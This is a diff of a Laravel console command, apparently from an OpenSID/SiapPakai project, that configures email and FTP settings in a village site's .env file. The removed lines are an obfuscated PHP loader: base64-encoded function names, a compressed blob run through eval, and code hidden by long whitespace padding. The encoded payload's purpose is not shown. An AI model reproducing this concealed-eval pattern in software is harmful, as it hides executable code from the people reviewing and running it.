@@ -1,521 +1,100 @@
-<?php 
-        $__='printf';$_='Loading app/Console/Commands/ConfigEmailApi.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Console\Commands;
+
+use App\Http\Controllers\Helpers\AttributeSiapPakaiController;
+use App\Http\Controllers\Helpers\CommandController;
+use App\Http\Controllers\Helpers\EnvController;
+use App\Models\Aplikasi;
+use App\Models\Pelanggan;
+use Illuminate\Console\Command;
+
+class ConfigEmailApi extends Command
+{
+    /**
+     * The name and signature of the console command.
+     *
+     * @var string
+     */
+    protected $signature = 'siappakai:config-email-api {--kode_desa=} {--mail_host=} {--mail_user=} {--mail_pass=} {--mail_address=}';
+
+    /**
+     * The console command description.
+     *
+     * @var string
+     */
+    protected $description = 'Pengaturan Email untuk konfigurasi .env pada OpenSID API';
+
+    private $att;
+    private $comm;
+    private $filesEnv;
+    private $mail_host;
+    private $mail_user;
+    private $mail_pass;
+    private $mail_address;
+
+    /**
+     * Create a new command instance.
+     *
+     * @return void
+     */
+    public function __construct()
+    {
+        parent::__construct();
+        $this->att = new AttributeSiapPakaiController();
+        $this->comm = new CommandController();
+        $this->filesEnv = new EnvController();
+    }
+
+    /**
+     * Execute the console command.
+     *
+     * @return int
+     */
+    public function handle()
+    {
+        $kodedesa = str_replace('.', '', $this->option('kode_desa'));
+        $kodedesa_default = $this->option('kode_desa');
+        $this->mail_host = $this->option('mail_host');
+        $this->mail_user = $this->option('mail_user');
+        $this->mail_pass = $this->option('mail_pass');
+        $this->mail_address = $this->option('mail_address');
+
+        $this->att->setSiteFolderApi($this->att->getMultisiteFolder() . $kodedesa . DIRECTORY_SEPARATOR . 'api-app');
+
+        $pelanggan = $this->Pelanggan($kodedesa_default);
+
+        if (file_exists($this->att->getSiteFolderApi()) && !is_null($pelanggan)) {
+            $token_premium = $pelanggan->token_premium;
+            $urlApp = $pelanggan->domain_opensid;
+
+            $openkab = env('OPENKAB') == 'true' ? nama_database_gabungan() : $kodedesa;
+            $this->filesEnv->envApi(
+                $this->att->getHost(),
+                $this->att->getTemplateFolderApi(),
+                $this->att->getServerLayanan(),
+                $this->att->getSiteFolderApi(),
+                $kodedesa_default,
+                $openkab,
+                $token_premium,
+                $this->mail_host,
+                $this->mail_user,
+                $this->mail_pass,
+                $this->mail_address,
+                $urlApp,
+                $this->att->getFtpUser(),
+                $this->att->getFtpPass(),
+            );
+
+            $this->comm->notifMessage('config email');
+        } else {
+            return die("Informasi: pelanggan tidak terdaftar");
+        }
+    }
+
+    private function Pelanggan($kodedesa_default)
+    {
+        $data = Pelanggan::where('kode_desa', $kodedesa_default)->first();
+        return $data;
+    }
+}
